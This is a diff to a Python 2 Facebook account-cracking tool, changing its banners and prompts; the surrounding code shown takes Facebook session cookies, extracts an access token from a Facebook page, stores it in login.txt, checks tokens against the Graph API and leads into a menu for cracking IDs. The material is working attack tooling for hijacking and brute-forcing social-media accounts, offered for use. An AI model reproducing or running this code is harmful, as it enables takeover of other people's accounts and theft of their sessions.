@@ -128,6 +128,8 @@ loginlogo = """
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP 
 \033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
+\033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
 \033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
@@ -139,6 +141,8 @@ cookieslogo = """
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
 \033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
@@ -152,6 +156,8 @@ tokenlogo = """
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
 \033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
+\033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
 \033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
@@ -163,6 +169,8 @@ idPasslogo = """
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
 \033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
@@ -176,6 +184,8 @@ cracklogo = """
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
 \033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
+\033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
 \033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
@@ -188,6 +198,8 @@ crackinglogo = """
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
 \033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
+\033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
 \033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420
@@ -199,6 +211,8 @@ checkerlogo = """
 \033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
 \033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
 \033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
+\033[1;97m--------------------------------------------
+      \033[1;97m\033[1;41m[ IF YOU DREAM IT CAN YOU DO IT ]\033[0m
 \033[1;97m--------------------------------------------
 \033[1;37m  \033[1;30m-> \033[1;31mAUTHOR   \033[1;36m: \033[1;32mRISHU KHAN ( AL3X )
 \033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 
@@ -215,7 +229,7 @@ def results(ok, cp):
         raw_input('[\xe2\x9e\xa3] Press Any Key To Go Back To Cracking Menu: ')
         cracking_menu()
     else:
-        print '\n\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] No Cracked Idz Found!'
+        print '\n\x1b[0;97m No Cracked Idz Found!'
         cracking_menu()
 
 
@@ -258,7 +272,7 @@ def login():
         print '\033[1;37m  \033[1;30m-> \033[1;31mVERSION  \033[1;36m: \033[1;32m3.0 '
         print '\033[1;37m  \033[1;30m> \033[1;31mFACEBOOK \033[1;36m: \033[1;32mwww.fb.com/Rishu.X.420'
         print '\033[1;97m--------------------------------------------'
-    zk = raw_input('\n  \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Password -> \033[1;32m')
+    zk = raw_input('\n  Enter Password -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -285,7 +299,7 @@ def zmbf():
         print '   [3] Exit Program '
         print '-------------------------------'
 
-    zk = raw_input('\n \x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Choose -> \033[1;32m')
+    zk = raw_input('\n \x1b[0;97m Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -305,10 +319,9 @@ def zmbf():
 def cookies():
     os.system('clear')
     print cookieslogo
-    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
-    print '\xe2\x94\x9c            Login Using FB ID Cookies           \xe2\x94\xa4'
-    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
-    cookies = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Cookies -> \x1b[0;92m')
+    print '     Login Using FB ID Cookies   '
+    print '--------------------------------------------'
+    cookies = raw_input(' \x1b[0;97mCookies -> \x1b[0;92m')
     try:
         data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36', 
            'referer': 'https://m.facebook.com/', 
@@ -320,9 +333,9 @@ def cookies():
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
            'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookies})
         find_token = re.search('(EAAA\\w+)', data.text)
-        results = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Invalid Cookies' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
+        results = ' \x1b[0;97m Invalid Cookies' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
     except requests.exceptions.ConnectionError:
-        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'
+        print ' \x1b[0;97m no Connection'
 
     cookies = open('login.txt', 'w')
     cookies.write(find_token.group(1))
@@ -343,7 +356,7 @@ def tokenz():
         print '   Login Using FB ID Access Token  '
         print '\033[1;97m--------------------------------------------'
         
-    token = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Token -> \x1b[0;92m')
+    token = raw_input(' \x1b[0;97m Token -> \x1b[0;92m')
     try:
         otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
         a = json.loads(otw.text)
@@ -355,7 +368,7 @@ def tokenz():
         os.system('xdg-open htpps://facebook.com/Rishu.X.420')
         zkbot()
     except KeyError:
-        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mInvalid Token')
+        zks(' \033[1;31mInvalid Token')
         tokenz()
 
 
@@ -364,7 +377,7 @@ def cracking_menu():
     try:
         token = open('login.txt', 'r').read()
     except IOError:
-        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
+        zks(' \x1b[0;97m Removing Token..! Login Again')
         os.system('clear')
         os.system('rm -rf login.txt')
         zmbf()
@@ -378,11 +391,11 @@ def cracking_menu():
         gender = z['gender']
     except KeyError:
         os.system('clear')
-        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
+        zks(' \x1b[0;97m Removing Token..! Login Again')
         os.system('rm -rf login.txt')
         zmbf()
     except requests.exceptions.ConnectionError:
-        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Internet Connection! Try Again')
+        exit(' \x1b[0;97m No Internet Connection! Try Again')
 
     print logo
     print '--------------------------------------------'
